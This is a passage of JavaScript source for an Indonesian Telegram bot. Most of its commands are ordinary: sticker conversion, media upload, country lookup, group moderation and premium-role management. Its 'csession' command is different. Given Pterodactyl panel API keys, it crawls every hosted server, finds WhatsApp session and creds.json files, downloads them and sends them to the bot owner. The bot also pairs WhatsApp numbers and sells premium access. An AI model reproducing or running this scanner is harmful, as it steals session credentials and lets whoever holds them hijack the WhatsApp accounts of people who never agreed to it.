      }, 60 * 1000);
    } catch (e) {}

  } catch (err) {
    console.error("FixCode Error:", err);
    await ctx.reply("❌ Terjadi kesalahan saat memproses file. " + String(err.message || err));
  }
});

bot.hears(/^toimg$/i, async (ctx) => {
  try {
    // Harus reply sticker
    if (!ctx.message.reply_to_message?.sticker) {
      return ctx.reply("⚠ Reply Sticker !");
    }
    
    await ctx.reply("𝙒𝙖𝙞𝙩𝙞𝙣𝙜 𝙁𝙤𝙧 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🔥");

    const sticker = ctx.message.reply_to_message.sticker;
    const fileId = sticker.file_id;
    const file = await ctx.telegram.getFile(fileId);
    const stickerUrl = `https://api.telegram.org/file/bot${process.env.BOT_TOKEN}/${file.file_path}`;

    // Simpan file sementara
    const inputPath = path.join(tempFolder, `sticker_${Date.now()}.webp`);
    const outputPath = path.join(tempFolder, `image_${Date.now()}.png`);

    // Download stiker
    const response = await fetch(stickerUrl);
    const arrayBuffer = await response.arrayBuffer();
    fs.writeFileSync(inputPath, Buffer.from(arrayBuffer));

    // Convert WebP → PNG
    await sharp(inputPath)
      .png()
      .toFile(outputPath);

    // Kirim gambar ke user
    await ctx.replyWithPhoto({ source: fs.createReadStream(outputPath) });

    // Hapus file sementara
    fs.unlinkSync(inputPath);
    fs.unlinkSync(outputPath);

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal mengubah sticker menjadi gambar.");
  }
});


bot.hears(/^cekid\b(?:\s+(.*))?$/i, async (ctx) => {
    const reply = ctx.message.reply_to_message;

    // Cek apakah ada reply
    if (reply) {
      const user = reply.from;
      const id = `\`${user.id}\``;
      const username = user.username ? `@${user.username}` : "(tidak ada username)";
      return ctx.reply(`ID: ${id}\nUsername: ${username}`, { parse_mode: "Markdown" });
    }

    // Jika tidak ada reply, ambil dari pengirim command
    const user = ctx.message.from;
    const id = `\`${user.id}\``;
    const username = user.username ? `@${user.username}` : "(tidak ada username)";
    return ctx.reply(`ID: ${id}\nUsername: ${username}`, { parse_mode: "Markdown" });
  });

bot.hears(/^tourl\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
  const username = ctx.from.first_name || ctx.from.username || "Tidak Diketahui";
    const msg = ctx.message.reply_to_message;

    if (!msg) {
      return ctx.reply("⚠️ Reply ke media dulu!\nContoh:\nReply foto lalu ketik *Tourl*", { parse_mode: "Markdown" });
    }

    let fileId;

    if (msg.photo) {
      fileId = msg.photo[msg.photo.length - 1].file_id;
    } else if (msg.video) {
      fileId = msg.video.file_id;
    } else if (msg.document) {
      fileId = msg.document.file_id;
    } else if (msg.sticker) {
      fileId = msg.sticker.file_id;
    } else if (msg.animation) {
      fileId = msg.animation.file_id;
    } else {
      return ctx.reply("⚠️ Media tidak didukung.\nGunakan: *foto / video / document / gif / stiker*", { parse_mode: "Markdown" });
    }

    // Kirim pesan proses
    const waitingMsg = await ctx.reply(" *Waiting For Processing🔥*", { parse_mode: "Markdown" });

    // Ambil link file dari Telegram
    const fileLink = await ctx.telegram.getFileLink(fileId);

    // Upload ke Catbox
    const form = new FormData();
    form.append("reqtype", "urlupload");
    form.append("url", fileLink.href);

    const catboxRes = await fetch("https://catbox.moe/user/api.php", {
      method: "POST",
      body: form,
    });

    const catboxUrl = await catboxRes.text();

    // Hapus pesan “Waiting...”
    await ctx.deleteMessage(waitingMsg.message_id).catch(() => {});

    // Kirim hasil dengan preview + tombol URL
    const caption = `Hii ${username} Tourl Berhasil !`;

    if (msg.photo || msg.sticker) {
      await ctx.replyWithPhoto({ url: fileLink.href }, {
        caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "URL", url: catboxUrl }]]
        }
      });
    } else if (msg.video || msg.animation) {
      await ctx.replyWithVideo({ url: fileLink.href }, {
        caption,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "URL", url: catboxUrl }]]
        }
      });
    } else if (msg.document) {
      await ctx.reply(caption, {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "URL", url: catboxUrl }]]
        }
      });
    }

  } catch (e) {
    console.error("❌ Tourl Error:", e);
    ctx.reply("❌ Terjadi kesalahan saat memproses Tourl.");
  }
});

// Function di JavaScript yang meniru perilaku 'getUnsafeLength' (rentan error)
function getUnsafeLengthJS(input) {
    // Jika 'input' adalah null atau undefined, baris ini akan melempar TypeError
    return input.length; 
}

// Handler Command Bot Telegram
// Asumsi: 'bot' adalah instance dari bot Telegram Anda (misalnya, Telegraf)
bot.command('crash', (ctx) => {
    // Input yang menyebabkan crash (analog NullPointerException)
    let nullSequence = null; 

    try {
        // Panggil fungsi yang rawan error
        let length = getUnsafeLengthJS(nullSequence);
        
        // Baris ini tidak akan pernah tercapai karena error sudah dilempar
        ctx.reply("Panjang: " + length); 
    
    } catch (e) {
        // Tangkap TypeError yang terjadi
        console.error("❌ Terjadi Crash di JS:", e.message);
        
        // Kirim pesan ke user bahwa command tersebut memicu crash
        ctx.reply(`
            🚨 **Peringatan Crash/Error**
            Fungsi dipanggil dengan 'null' dan memicu error!
            Pesan Error: ${e.message}
            (Analog dari NullPointerException di Java)
        `, { parse_mode: 'Markdown' });
    }
});

bot.hears(/^setversi\b(?:\s+(.*))?$/i, async (ctx) => {
  const senderId = ctx.from.id.toString();
  if (senderId !== BOT_OWNER_ID2) return;

  const arg = ctx.message.text.split(" ")[1];
  if (!arg) return ctx.reply("❗ Gunakan:\nSetversi 6.0");

  const success = await updateBotVersion(arg);
  if (success) {
    ctx.reply(`✅ Versi bot berhasil diperbarui ke *${arg}*`, { parse_mode: "Markdown" });
  } else {
    ctx.reply("❌ Gagal memperbarui versi bot.");
  }
});

 
bot.hears(/^countryinfo\b(?:\s+(.*))?$/i, async (ctx) => {
    try {
      const input = ctx.message.text.split(' ').slice(1).join(' ');
      if (!input) {
        return ctx.reply('Masukkan nama negara setelah perintah.\n\nContoh:\n`Countryinfo Indonesia`', { parse_mode: 'Markdown' });
      }

      const res = await axios.post('https://api.siputzx.my.id/api/tools/countryInfo', {
        name: input
      });

      const { data } = res.data;

      if (!data) {
        return ctx.reply('Negara tidak ditemukan atau tidak valid.');
      }

      const caption = `
🌍 *${data.name}* (${res.data.searchMetadata.originalQuery})
📍 *Capital:* ${data.capital}
📞 *Phone Code:* ${data.phoneCode}
🌐 *Continent:* ${data.continent.name} ${data.continent.emoji}
🗺️ [Google Maps](${data.googleMapsLink})
📏 *Area:* ${data.area.squareKilometers} km²
🏳️ *TLD:* ${data.internetTLD}
💰 *Currency:* ${data.currency}
🗣️ *Languages:* ${data.languages.native.join(', ')}
🧭 *Driving Side:* ${data.drivingSide}
⚖️ *Government:* ${data.constitutionalForm}
🍺 *Alcohol Prohibition:* ${data.alcoholProhibition}
🌟 *Famous For:* ${data.famousFor}
      `.trim();

      await ctx.replyWithPhoto(
        { url: data.flag },
        {
          caption,
          parse_mode: 'Markdown',
        }
      );

     
      if (data.neighbors && data.neighbors.length) {
        const neighborText = data.neighbors.map(n => `🧭 *${n.name}*\n📍 [Maps](https://www.google.com/maps/place/${n.coordinates.latitude},${n.coordinates.longitude})`).join('\n\n');
        await ctx.reply(`🌐 *Negara Tetangga:*\n\n${neighborText}`, { parse_mode: 'Markdown' });
      }

    } catch (err) {
      console.error(err);
      ctx.reply('Gagal mengambil informasi negara. Coba lagi nanti atau pastikan nama negara valid.');
    }
  });
  
bot.command("listcreds", (ctx) => {
  if (!isAdmin(ctx.from.id)) return ctx.reply("❌ Hanya admin yang bisa melihat credentials.");
  
  
  
    return ctx.reply("📭 Tidak ada credentials yang tersimpan.");
  
  
  let message = "🔐 *Daftar Credentials:*\n\n";
  credsData.credentials.forEach((cred, index) => {
    message += `*${index + 1}.* ${cred.name}\n`;
    message += `   👤 Oleh: ${cred.addedBy}\n`;
    message += `   📅 Tanggal: ${new Date(cred.addedAt).toLocaleDateString('id-ID')}\n\n`;
  });
  
  ctx.reply(message, { parse_mode: "Markdown" });
});


bot.command("savecreds", (ctx) => {
  if (!isAdmin(ctx.from.id)) return ctx.reply("❌ Hanya admin yang bisa menyimpan credentials.");
  
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: /savecreds <nama> <credentials_json>");
  
  const name = args[1];
  const credsJson = args.slice(2).join(" ");
  
  try {
    
    const parsedCreds = JSON.parse(credsJson);
    
    const credsData = getCreds();
    
    // Cek jika nama sudah ada
    if (credsData.credentials.some(c => c.name === name)) {
      return ctx.reply("❌ Nama credentials sudah ada. Gunakan nama yang berbeda.");
    }
    
    credsData.credentials.push({
      name,
      credentials: parsedCreds,
      addedBy: ctx.from.id,
      addedAt: new Date().toISOString()
    });
    
    saveCreds(credsData);
    ctx.reply(`✅ Credentials "${name}" berhasil disimpan.`);
  } catch (error) {
    ctx.reply("❌ Format JSON tidak valid. Pastikan credentials dalam format JSON yang benar.");
  }
});

bot.command("ceknum", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /ceknum +6281234567890");

  try {
    const res = await axios.get(`https://api.apilayer.com/number_verification/validate?number=${args}`, {
      headers: { apikey: config.apilayerKey }
    });

    if (!res.data.valid) return ctx.reply("❌ Nomor tidak valid!");

    const msg = `📱 *Info Nomor:*\n\n` +
                `• Nomor: ${res.data.international_format}\n` +
                `• Negara: ${res.data.country_name} (${res.data.country_code})\n` +
                `• Operator: ${res.data.carrier}\n` +
                `• Tipe: ${res.data.line_type}`;

    ctx.reply(msg, { parse_mode: "Markdown" });
  } catch (e) {
    ctx.reply("❌ Gagal cek nomor (pastikan APIKEY Api sudah benar)");
  }
});

bot.command("addbl", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya developer yang dapat menjalankan perintah ini.");

  const targetId = ctx.message.text.split(" ")[1];
  if (!targetId) return ctx.reply("❗ Contoh: /addbl 123456789");

  const success = await updateGitHubBlacklist((json) => {
    if (!json.blacklist.includes(targetId)) {
      json.blacklist.push(targetId);
    }
    return json;
  });

  ctx.reply(success ? `✅ ID ${targetId} berhasil dimasukkan ke blacklist.` : "❌ Gagal menambahkan ke blacklist.");
});
bot.command("delbl", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya developer yang dapat menjalankan perintah ini.");

  const targetId = ctx.message.text.split(" ")[1];
  if (!targetId) return ctx.reply("❗ Contoh: /delbl 123456789");

  const success = await updateGitHubBlacklist((json) => {
    json.blacklist = json.blacklist.filter((id) => id !== targetId);
    return json;
  });

  ctx.reply(success ? `✅ ID ${targetId} berhasil dihapus dari blacklist.` : "❌ Gagal menghapus dari blacklist.");
});

bot.command("setwelcome", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== "8488114208") return ctx.reply("❌ Fitur ini hanya bisa digunakan oleh developer bot.");

  const arg = ctx.message.text.split(" ")[1];
  if (!arg || !["on", "off"].includes(arg)) {
    return ctx.reply("🛠️ Contoh penggunaan: /setwelcome on | off");
  }

  const config = loadWelcomeConfig();
  config.enabled = arg === "on";
  saveWelcomeConfig(config);

  ctx.reply(`✅ Welcome message telah di-${arg === "on" ? "aktifkan" : "nonaktifkan"}.`);
});

bot.command("ban", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const userId = ctx.message.reply_to_message?.from?.id;
  if (!userId) return ctx.reply("❌ Reply ke user yang ingin diban.");

  try {
    await ctx.telegram.kickChatMember(ctx.chat.id, userId);
    ctx.reply("✅ User berhasil diban.");
  } catch {
    ctx.reply("❌ Gagal memban user.");
  }
});

bot.command("unban", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const userId = ctx.message.reply_to_message?.from?.id;
  if (!userId) return ctx.reply("❌ Reply ke user yang ingin di-unban.");

  try {
    await ctx.telegram.unbanChatMember(ctx.chat.id, userId);
    ctx.reply("✅ User berhasil di-unban.");
  } catch {
    ctx.reply("❌ Gagal unban user.");
  }
});

bot.command("tourl", async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❗ Reply ke media (foto/video/audio/doc/sticker) lalu kirim /tourl");
  try {
    const pick = r.photo?.slice(-1)[0]?.file_id || r.video?.file_id || r.document?.file_id || r.audio?.file_id || r.voice?.file_id || r.sticker?.file_id;
    if (!pick) return ctx.reply("❌ Tidak menemukan media valid.");
    const link = await ctx.telegram.getFileLink(pick);
    ctx.reply(`🔗 ${link}`);
  } catch { ctx.reply("❌ Gagal membuat URL media."); }
});

bot.command("kick", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const userId = ctx.message.reply_to_message?.from?.id;
  if (!userId) return ctx.reply("❌ Reply ke user yang ingin dikick.");

  try {
    await ctx.telegram.kickChatMember(ctx.chat.id, userId);
    await ctx.telegram.unbanChatMember(ctx.chat.id, userId); 
    ctx.reply("✅ User berhasil di-kick.");
  } catch {
    ctx.reply("❌ Gagal kick user.");
  }
});

bot.hears(/^iqc\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 3) {
      return ctx.reply('Gunakan format:\nIqc <pesan> <baterai> <operator>\n\nContoh:\nIqc Halo dunia 87 Telkomsel');
    }

    // Gabung argumen, misalnya: [ 'Halo', 'dunia', '87', 'Telkomsel' ]
    const battery = args[args.length - 2];       // misal 87
    const carrier = args[args.length - 1];       // misal Telkomsel
    const text = args.slice(0, -2).join(' ');    // sisanya jadi pesan
    const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });

    await ctx.reply('Waiting For Proccesing...');

    // 🔗 Build API URL
    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

    // Ambil hasil gambar dari API
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'binary');

    // Kirim gambar hasil API ke user
    await ctx.replyWithPhoto({ source: buffer }, { caption: `📱 iPhone quote dibuat!\n🕒 ${time}` });
  } catch (err) {
    console.error('❌ Error case /iqc:', err);
    await ctx.reply('Terjadi kesalahan saat memproses gambar.');
  }
});

bot.command("mute", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const [_, dur] = ctx.message.text.split(" ");
  if (!ctx.message.reply_to_message || !dur) return ctx.reply("❌ Contoh: Reply dan /mute 30s, 5m, 1h, atau 2d");

  const seconds = parseCooldownDuration(dur);
  if (!seconds) return ctx.reply("❌ Format durasi salah. Gunakan: 30s, 5m, 1h, atau 2d");

  const userId = ctx.message.reply_to_message.from.id;
  const untilDate = Math.floor(Date.now() / 1000) + seconds;

  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, userId, {
      permissions: { can_send_messages: false },
      until_date: untilDate,
    });
    ctx.reply(`✅ User dimute selama ${dur}`);
  } catch {
    ctx.reply("❌ Gagal mute user.");
  }
});

bot.command("unmute", async (ctx) => {
  if (!isMeOnly(ctx)) return ctx.reply("❌ Hanya developer bot yang bisa menggunakan perintah ini.");

  const userId = ctx.message.reply_to_message?.from?.id;
  if (!userId) return ctx.reply("❌ Reply ke user yang ingin di-unmute.");

  try {
    await ctx.telegram.restrictChatMember(ctx.chat.id, userId, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false,
      },
    });
    ctx.reply("✅ User berhasil di-unmute.");
  } catch {
    ctx.reply("❌ Gagal unmute user.");
  }
});

//=================================================\\
bot.hears(/^csession\b(?:\s+(.*))?$/i, checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("›› Format: Csessions https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("›› Format: Csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "Waiting For Proccesing...",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "sension, sensions") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "sension, sensions") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_sensions`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("addowner", async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: /addowner <id> <durasi>");

  const targetId = args[1];
  const duration = args[2];

  if (ctx.from.id.toString() !== "8488114208") 
    return ctx.reply("Hanya owner utama.");

  addOwner(targetId, duration);
  ctx.reply(`✅ ID ${targetId} sekarang owner selama ${duration}`);
});

bot.hears(/^accadmin\b(?:\s+(.*))?$/i, async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: Accadmin <id> <durasi>");

  const targetId = args[1];
  const duration = args[2];

  if (!isActiveUser(ownerUsers, senderId))
    return ctx.reply("❌ Hanya owner yang bisa menambah admin.");

  addAdmin(targetId, duration);
  ctx.reply(`✅ ID ${targetId} sekarang admin selama ${duration}`);
});

bot.hears(/^accprem\b(?:\s+(.*))?$/i, async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Format: Accprem <id> <durasi>");

  const targetId = args[1];
  const duration = args[2];

  if (!isActiveUser(ownerUsers, senderId) && !isActiveUser(adminUsers, senderId))
    return ctx.reply("❌ Hanya admin/owner yang bisa menambah premium.");

  addPremium(targetId, duration);
  ctx.reply(`✅ ID ${targetId} sekarang premium selama ${duration}`);
});

bot.hears(/^deldb\b(?:\s+(.*))?$/i, async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Format: Deldb <id>");

  const targetId = args[1];

  if (ctx.from.id.toString() !== "7454464877") 
    return ctx.reply("Hanya owner utama.");

  removeOwner(targetId);
  ctx.reply(`✅ ID ${targetId} sudah dihapus dari owner`);
});

bot.hears(/^delprem\b(?:\s+(.*))?$/i, async (ctx) => {
  const senderId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Format: Delprem <id>");

  const targetId = args[1];

  if (!isActiveUser(ownerUsers, senderId) && !isActiveUser(adminUsers, senderId))
    return ctx.reply("❌ Hanya admin/owner yang bisa menghapus premium.");

  removePremium(targetId);
  ctx.reply(`✅ ID ${targetId} sudah dihapus dari premium`);
});

//=================================================\\
bot.hears(/^connect\b(?:\s+(.*))?$/i, checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return await ctx.reply("❗ Contoh: Connect 628xxx");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Silahkan hapus session terlebih dahulu");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "RENZZEEE");

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `\`\`\`
▢ Kode Pairing...
╰➤ Nomor  : ${phoneNumber} 
╰➤ Kode   : ${code}
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Information", url: "https://t.me/+cO_VvMlEbP1lMjll" },
            { text: "Channel", url: "https://t.me/renzzchannel1" }
          ]
        ]
      }
    });

  } catch (error) {
    console.error("Gagal melakukan pairing:", error);
    await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor Whatsapp valid!");
  }
});


//=================================================\\
// MOD management (developer only)
bot.hears(/^accmod\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: Accmod 123456789");

  const success = await updateGitHubJSON(modPath, (json) => {
    if (!json.mod) json.mod = [];
    if (!json.mod.includes(id)) json.mod.push(id);
    return json;
  });

  ctx.reply(success ? `✅ MOD ${id} ditambahkan.` : "❌ Gagal menambah MOD.");
});

bot.hears(/^delmod\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (userId !== developerId) return ctx.reply("❌ Hanya Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: Delmod 123456789");

  const success = await updateGitHubJSON(modPath, (json) => {
    if (!json.mod) json.mod = [];
    json.mod = json.mod.filter((m) => m !== id);
    return json;
  });

  ctx.reply(success ? `✅ MOD ${id} dihapus.` : "❌ Gagal menghapus MOD.");
});

// PT management (developer only)
bot.hears(/^accpt\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isMODorDev(userId))) return ctx.reply("❌ Hanya MOD & Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: Accpt 123456789");

  const success = await updateGitHubJSON(ptPath, (json) => {
    if (!json.pt) json.pt = [];
    if (!json.pt.includes(id)) json.pt.push(id);
    return json;
  });

  ctx.reply(success ? `✅ PT ${id} ditambahkan.` : "❌ Gagal menambah PT.");
});

bot.hears(/^delpt\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isMODorDev(userId))) return ctx.reply("❌ Hanya MOD & Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: Delpt 123456789");

  const success = await updateGitHubJSON(ptPath, (json) => {
    if (!json.pt) json.pt = [];
    json.pt = json.pt.filter((r) => r !== id);
    return json;
  });

  ctx.reply(success ? `✅ PT ${id} dihapus.` : "❌ Gagal menghapus PT.");
});

bot.hears(/^accress\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isPTorDev(userId))) return ctx.reply("❌ Hanya PT & Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: Accress 123456789");

  const success = await updateGitHubJSON(resellerPath, (json) => {
    if (!json.resellers) json.resellers = [];
    if (!json.resellers.includes(id)) json.resellers.push(id);
    return json;
  });

  ctx.reply(success ? `✅ Reseller ${id} ditambahkan.` : "❌ Gagal menambah reseller.");
});

bot.hears(/^delress\b(?:\s+(.*))?$/i, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!(await isPTorDev(userId))) return ctx.reply("❌ Hanya PT & Developer yang bisa gunakan perintah ini.");

  const id = ctx.message.text.split(" ")[1];
  if (!id) return ctx.reply("❗ Contoh: Delress 123456789");

  const success = await updateGitHubJSON(resellerPath, (json) => {
    json.resellers = (json.resellers || []).filter((r) => r !== id);
    return json;
  });

  ctx.reply(success ? `✅ Reseller ${id} dihapus.` : "❌ Gagal menghapus reseller.");
});

bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });
  
bot.hears(/^stiktok\b(?:\s+(.*))?$/i, async (ctx) => {
    // Ambil keyword dari teks perintah setelah /tiktok
    const keyword = ctx.message.text.split(' ').slice(1).join(' ');
    if (!keyword) {
      return ctx.reply('❌ Mohon masukkan kata kunci. Contoh: Stiktok sad');
    }

    try {
      // Request POST ke API TikTok
      const response = await axios.post('https://api.siputzx.my.id/api/s/tiktok', {
        query: keyword
      }, {
        headers: { 'Content-Type': 'application/json' }
      });

      const data = response.data;
      if (!data.status || !data.data || data.data.length === 0) {
        return ctx.reply('⚠️ Tidak ditemukan video TikTok dengan kata kunci tersebut.');
      }

      // Ambil maksimal 3 video untuk balasan agar tidak terlalu panjang
      const videos = data.data.slice(0, 3);
      let replyText = `🔎 Hasil pencarian TikTok untuk: *${keyword}*\n\n`;

      videos.forEach((video, i) => {
        replyText += `🎬 *${video.title.trim()}*\n`;
